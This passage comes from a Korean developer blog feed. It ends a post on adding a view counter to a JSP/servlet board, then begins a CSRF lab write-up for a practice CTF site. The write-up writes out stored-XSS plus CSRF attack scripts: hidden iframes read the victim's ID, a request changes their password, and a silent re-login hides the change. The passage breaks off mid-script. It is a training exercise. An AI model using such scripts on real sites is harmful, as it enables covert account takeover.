  <li>조회수 컬럼(views 컬럼) 게시판 테이블에 추가.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0bb3c436-e605-4a3b-9e26-7ace9089fec5" alt="Pasted image 20230525034420" /></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alter table notice_board add views number(20) default 0 not null;

# 조회수 값 1 증가 하기.
update notice_board set views = 1 where sid=101;
</code></pre></div></div>

<h3 id="jsp-3">JSP</h3>
<h4 id="설명-6">설명</h4>
<ul>
  <li>사용자가 게시글 방문하면 게시글 조회수는 1 증가한다.</li>
  <li>사용자는 게시글의 조회수를 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8eb01948-7e41-4ff0-88e5-d9c93e6ff193" alt="Pasted image 20230525041326" /></li>
</ul>

<h4 id="과정-6">과정</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7Iuc7YKk6riwXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
<ol>
  <li>사용자는 서버로 게시글 페이지를 요청한다.</li>
  <li>서버에서 게시글 조회수를 1 증가 시킨다.</li>
  <li>게시글 페이지를 완성하여 사용자에게 전달한다.</li>
</ol>

<h4 id="코드--noticejsp--1">코드 ( notice.jsp )</h4>

<ul>
  <li>조회수 가져오기</li>
  <li>notice는 servlet 에서 가져온 것이다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%=</span><span class="n">notice</span><span class="o">.</span><span class="na">getViews</span><span class="o">()</span> <span class="nt">%&gt;</span>
</code></pre></div></div>

<h3 id="servlet-3">Servlet</h3>
<h4 id="설명-7">설명</h4>
<ul>
  <li>사용자가 게시글에 방문하면 table의 조회수 값을 1증가 시킨다.</li>
</ul>

<h4 id="과정-7">과정</h4>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsobDtmozsiJggMSDspp3qsIAg7J2R64u1XG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOqyjOyLnOq4gCDtjpjsnbTsp4Ag7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
<ol>
  <li>사용자는 서버로 게시글 페이지를 요청한다.</li>
  <li>서버는 DB 서버의 게시판 테이블에 조회수 값을 1증가 시켜 저장한다.</li>
  <li>서버는 게시글 페이지를 완성하여 사용자에게 전달한다.</li>
</ol>

<h4 id="코드--mainpagejava--1">코드 ( MainPage.java )</h4>

<ul>
  <li>조회수 1 증가 하기</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 자세히 보기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDetail</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 조회수 1 증가 시키기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeSID</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">incressViews</span><span class="o">(</span><span class="n">noticeSID</span><span class="o">,</span> <span class="n">notice</span><span class="o">.</span><span class="na">getViews</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">notice</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">getNotice</span><span class="o">(</span><span class="n">noticeSID</span><span class="o">);</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">notice</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 조회수 증가 end</span>
</code></pre></div></div>

<h4 id="코드--noticejava">코드 ( Notice.java)</h4>
<ul>
  <li>조회수 부분을 추가하였다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Notice</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">long</span> <span class="n">views</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nf">Notice</span><span class="o">(</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">long</span> <span class="n">views</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">getViews</span><span class="o">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">views</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
</code></pre></div></div>

<h4 id="코드--noticeboarddaojava-">코드 ( NoticeBoardDAO.java )</h4>
<ul>
  <li>DB의 게시판 테이블에 저장된 조회수 값을 1 증가시킨다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// 조회수 1 카운트 증가시키기</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">long</span> <span class="nf">incressViews</span><span class="o">(</span><span class="kt">long</span> <span class="n">sid</span><span class="o">,</span> <span class="kt">long</span> <span class="n">currentViews</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"update notice_board set views = "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">currentViews</span><span class="o">+</span><span class="mi">1</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where sid="</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">sid</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">pstmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="n">pstmt</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sid</span><span class="o">+</span><span class="s">" 글 조회수 업데이트 : "</span><span class="o">+</span><span class="n">re</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">finally</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">sid</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h2 id="발생한-오류">발생한 오류</h2>
<ul>
  <li>Unable to process parts as no multi-part configuration has been provided</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var parts = request.getParts();
Unable to process parts as no multi-part configuration has been provided

web.xml 에 &lt;multipart-config&gt; 설정을 해 줘야 한다.
</code></pre></div></div>

<ul>
  <li>413 Request Entity Too Large</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nginx.conf
http {
	client_max_body_size 6M;
	...
}
</code></pre></div></div>

<h2 id="후기">후기</h2>
<ul>
  <li>직접 업로드와 다운로드 기능을 만들면서 어떤 방식으로 동작하는지 알 수 있는 계기가 되었다. 특히 다운로드 기능을 구현할 때 인코딩 에러가 발생하여 당황스러웠지만 응답 헤더를 고치니 해결되어 다행이었다.</li>
  <li>조회수를 구현은 생각보다 간단하였다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>

<ul>
  <li><a href="https://coding-factory.tistory.com/284">Java 자바로 폴더(디렉토리) 삭제하기(하위파일, 폴더 포함) (tistory.com)</a></li>
  <li><a href="https://coding-factory.tistory.com/283">Java 자바로 폴더(디렉토리) 생성하기 (tistory.com)</a></li>
  <li><a href="https://hianna.tistory.com/589">Java 파일, 디렉토리 존재 여부 확인하기 - 어제 오늘 내일 (tistory.com)</a></li>
  <li><a href="https://dololak.tistory.com/726">코끼리를 냉장고에 넣는 방법 :: 서블릿/JSP Servlet 3.0에서 Part API를 통한 파일업로드 구현하기 (tistory.com)</a></li>
  <li><a href="https://www.geeksforgeeks.org/how-to-add-file-uploads-function-to-a-webpage-in-html/">How to add file uploads function to a webpage in HTML ? - GeeksforGeeks</a></li>
  <li><a href="https://bloghelloworld.tistory.com/398">HTTP GET 방식으로 서버에 요청하기 (작성중) (tistory.com)</a></li>
  <li><a href="https://dlee0129.tistory.com/214">자바(JAVA) - 폴더 파일명 변경 (tistory.com)</a></li>
  <li><a href="https://webdir.tistory.com/435">WEBDIR :: 폼 필드(input type=”file”) 디자인 #4 (tistory.com)</a></li>
  <li><a href="https://hhyemi.github.io/2020/11/05/11051627.html">JavaScript - 파일 용량 제한 - CODE:H (hhyemi.github.io)</a></li>
  <li><a href="https://bloghelloworld.tistory.com/400">fetch()로 원격 API 호출하기 (tistory.com)</a></li>
  <li><a href="https://lee1535.tistory.com/30">Javascript/Jquery TABLE 행 추가, 삭제, 체크된 table row 삭제 방법 (tistory.com)</a></li>
  <li><a href="https://5bong2-develop.tistory.com/106">JavaScript - JSON 데이터 변환, 추출, 원하는 데이터 찾기 (tistory.com)</a></li>
  <li><a href="https://developer.mozilla.org/ko/docs/Web/API/Fetch_API/Using_Fetch">Fetch 사용하기 - Web API MDN (mozilla.org)</a></li>
  <li><a href="https://kwonnam.pe.kr/wiki/java/servlet/download">java:servlet:download 권남 (kwonnam.pe.kr)</a></li>
  <li><a href="https://server-talk.tistory.com/183">MIME이란 무엇인가? (tistory.com)</a></li>
  <li><a href="https://blog.leocat.kr/notes/2020/04/21/nginx-413-request-entity-too-large">nginx 413 Request Entity Too Large 오류 (leocat.kr)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="oracle db" /><category term="servlet" /><category term="jsp" /><category term="nginx" /><summary type="html"><![CDATA[업로드 다운로드 조회수 기능 만들기.]]></summary></entry><entry><title type="html">CSRF 실습 1</title><link href="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/" rel="alternate" type="text/html" title="CSRF 실습 1" /><published>2023-05-23T00:00:00+09:00</published><updated>2021-05-23T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%8B%A4%EC%8A%B51/"><![CDATA[<h2 id="csrf-실습-1번-문제">CSRF 실습 1번 문제</h2>
<ul>
  <li><strong>csrf 공격</strong>을 이용하여 계정의 비밀번호를 바꿔야한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c98520c7-9094-4710-a7f4-ed2bebd17d88" alt="Pasted image 20230522191000" /></li>
</ul>

<h2 id="취약점-찾기">취약점 찾기</h2>

<h3 id="게시판-xss-취약점--stored-xss-취약점-">게시판 XSS 취약점 ( Stored XSS 취약점 )</h3>
<ul>
  <li>게시판 제목과 게시판 본문에 클라이언트 스크립트가 삽입된다.</li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">alert</code> 스크립트 코드를 이용하여 취약점 확인이 가능하다.</p>
  </li>
  <li>
    <p>게시판 제목<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/928e3995-ef07-45a4-9cea-d420b2dbf74f" alt="Pasted image 20230522205649" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/ec5356a7-0f25-4d09-9c2d-c9b00f27c5c2" alt="Pasted image 20230522205704" /></p>
  </li>
  <li>본문<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f9fddf28-eba9-44e0-9be3-666c478f7c93" alt="Pasted image 20230522205555" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d5f87e21-aebc-4f53-bde8-37fcd48b46ed" alt="Pasted image 20230522205622" /></li>
</ul>

<h3 id="비밀번호-변경-요청--csrf-취약점-">비밀번호 변경 요청 ( CSRF 취약점 )</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">burp suite</code> 를 통해 POST 로 비밀번호 변경 요청을 보내는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7adae6a0-98ee-47e4-9a76-bb2703d428d5" alt="Pasted image 20230522205846" /></li>
  <li>POST 방식에서 GET 방식으로 바꾸어 요청을 보내도 비밀번호가 변경되는 것을 확인할 수 있다.  로그인 한 상태에서 아래의 링크에 접속하면 비밀번호가 성공적으로 2222로 바뀐다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<ul>
  <li>GET 을 통한 비밀번호 변경<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6e4840aa-91c9-461e-baa6-35a4ef7e0730" alt="Pasted image 20230522210844" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8d226f78-21e1-4750-822b-948174332578" alt="Pasted image 20230522210619" /></li>
  <li>즉 URL 링크에 로그인한 사용자 브라우저에서 접속하게 된다면 사용자 몰래 비밀번호 변경이 가능하다.</li>
</ul>

<h3 id="로그인">로그인</h3>
<ul>
  <li>post 요청으로만 로그인을 할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09e59aea-5fa1-4aee-a10d-306c196de303" alt="Pasted image 20230522225144" /></li>
</ul>

<h2 id="공격-시나리오">공격 시나리오</h2>
<h3 id="url-클릭-유도하기">URL 클릭 유도하기</h3>
<ul>
  <li>crsf 취약점이 있는 비밀번호 변경 url을 이용한다.</li>
  <li>공격자가 비밀번호 변경 url 을 만들어 사용자에게 보내 클릭하도록 유도한다.</li>
  <li>하지만 이러한 공격을 성공시킬려면 사용자가 로그인을 한 상태에서 공격자에게서 받은 링크에 접속하여야 한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>비밀번호 2222로 변경하기
http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<h3 id="xss--csrf-취약점-합쳐서-공격하기">XSS + CSRF 취약점 합쳐서 공격하기</h3>
<h4 id="최종-목표">최종 목표</h4>
<ul>
  <li>사용자가 게시글을 열람하면 사용자의 비밀번호가 공격자가 설정한 비밀번호로 즉시 변경된다. 단 사용자는 비밀번호 변경이 일어났는지 알아서는 안된다.</li>
</ul>

<h4 id="현재-서버-비밀번호-변경시-발생되는-일--예측-">현재 서버 비밀번호 변경시 발생되는 일 ( 예측 )</h4>
<ol>
  <li>정상적으로 비밀번호 변경을 요청하면 비밀번호가 사용자가 입력한 값으로 바뀐다.</li>
  <li>현재 로그인 중인 세션 값은 만료가 되어 로그아웃이 된다.</li>
  <li>다시 로그인 하기 위하여 로그인 페이지로 넘어간다.</li>
</ol>

<h4 id="공격-시나리오-1">공격 시나리오</h4>
<ol>
  <li>공격자는 악의적인 스크립트가 들어간 게시글을 작성한다.</li>
  <li>사용자가 로그인 하여 게시글을 살펴본다.</li>
  <li>사용자는 공격자가 작성한 게시글을 클릭하여 게시글 페이지에 들어간다.</li>
  <li>게시글 페이지에 들어가면 악의적인 스크립트에 의해 사용자의 비밀번호가 공격자가 설정한 비밀번호로 변경된다.</li>
</ol>

<h4 id="공격-스크립트-작성">공격 스크립트 작성</h4>

<h5 id="마이페이지를-통해-아이디-가져오기">마이페이지를 통해 아이디 가져오기</h5>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3c459cd1-2d95-4cbb-9e2c-c9c013ec1fe7" alt="Pasted image 20230523003251" /></p>

<ul>
  <li>마이페이지를 통해 사용자 아이디 찾기.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span>  <span class="na">onload=</span><span class="s">"get_id()"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="비밀번호-변경-스크립트">비밀번호 변경 스크립트</h5>
<ul>
  <li>img 태그의 src 부분을 이용하였다.</li>
  <li>게시글 방문만 하면 바로 비밀번호가 변경된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=2222</span><span class="dl">"</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="다시-공격자가-설정한-비밀번호로-다시-로그인하기">다시 공격자가 설정한 비밀번호로 다시 로그인하기.</h5>
<ul>
  <li>세션 값을 못 쓰게되어 자동으로 로그아웃이 된다. 따라서 iframe을 통해 다시 로그인하여 사용자는 로그아웃 없이 계속 페이지를 이용하는 것 처럼 느낄 수 있다.</li>
  <li>
    <p>다시 로그인을 해주면 세션 값이 새로운 값으로 바뀌게 된다.</p>
  </li>
  <li>로그인 화면 표시.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<ul>
  <li>아이디 및 비밀번호 입력 &amp; 로그인 하기</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-pw</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">pw</span><span class="p">;</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h5 id="최종-공격-스크립트">최종 공격 스크립트</h5>
<ul>
  <li>가장 먼저 마이페이지에서 아이디를 가지고 온다.</li>
  <li>그런 다음 비밀번호를 변경하여준다.</li>
  <li>마지막으로 바뀐 비밀번호로 다시 로그인해준다.</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/mypage.php"</span> <span class="na">onload=</span><span class="s">"get_id()"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/iframe&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">src=</span><span class="s">"http://ctf.segfaulthub.com:7777/csrf_1/login.php"</span> <span class="na">onload=</span><span class="s">"change()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">pw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">1234</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">function</span> <span class="nf">get_id</span><span class="p">(){</span>
	<span class="nx">id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">placeholder</span><span class="p">;</span>
	
	<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php?id=&amp;info=&amp;pw=</span><span class="dl">"</span><span class="o">+</span><span class="nx">pw</span><span class="p">;</span>
<span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="nx">url</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">change</span><span class="p">(){</span>
	<span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">login-id</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
